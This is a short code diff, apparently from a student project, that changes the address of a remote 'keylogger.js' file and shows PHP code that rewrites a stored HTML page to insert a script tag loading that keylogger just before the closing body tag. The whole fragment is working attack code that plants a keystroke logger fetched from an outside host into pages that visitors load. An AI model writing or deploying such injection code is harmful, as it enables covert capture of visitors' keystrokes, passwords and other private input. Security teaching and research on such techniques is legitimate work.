@@ -47,7 +47,7 @@ foreach($html->find('img') as $element){
 
 
 //ADDING IN THE KEYLOGGER SCRIPT INTO HTML ON SERVER
-$keyloggerscript = "http://finalyearproject.pe.hu/js/keylogger.js";
+$keyloggerscript = "http://individualproject.esy.es/js/keylogger.js";
 $textToInsert="script src='$keyloggerscript'></script>";
 $contents = file_get_contents("$htmlFileName");
 $newContent = preg_replace("</body>", $textToInsert."</body", $contents);
